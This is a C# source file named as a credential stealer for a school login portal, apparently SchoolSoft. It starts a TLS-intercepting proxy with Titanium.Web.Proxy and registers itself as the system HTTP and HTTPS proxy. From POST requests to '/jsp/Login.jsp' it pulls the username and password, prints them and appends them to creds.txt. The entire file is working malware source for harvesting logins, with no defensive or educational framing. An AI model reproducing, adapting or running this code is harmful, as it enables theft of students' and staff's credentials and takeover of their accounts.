using System;
using System.IO;
using System.Threading.Tasks;
using System.Net;
using Titanium.Web.Proxy;
using Titanium.Web.Proxy.EventArguments;
using Titanium.Web.Proxy.Models;

namespace schoolSoftCredentialsStealer
{  
    class Program
    {
        static void Main()
        {
            using (ProxyServer ps = new ProxyServer(true, true, true))
            {
                ps.BeforeRequest += OnRequest;
                var explicitEndPoint = new ExplicitProxyEndPoint(IPAddress.Any, 8000, true);
                ps.AddEndPoint(explicitEndPoint);
                ps.Start();
                ps.SetAsSystemHttpProxy(explicitEndPoint);
                ps.SetAsSystemHttpsProxy(explicitEndPoint);

                Console.ReadLine();
            }
        }
        public static async Task OnRequest(object sender, SessionEventArgs e)
        {
            if (e.HttpClient.Request.Method.ToUpper() == "POST" && e.HttpClient.Request.RequestUri.AbsoluteUri.Contains("/jsp/Login.jsp"))
            {
                string bodyString = await e.GetRequestBodyAsString();
                string readableCreds = "Username: " + bodyString.Split('&')[2].Split('=')[1] + "\n" + "Password: " + bodyString.Split('&')[3].Split('=')[1] + "\n";
                
                Console.WriteLine(readableCreds);
                File.AppendAllText("creds.txt", readableCreds);
            }
        }
    }
}
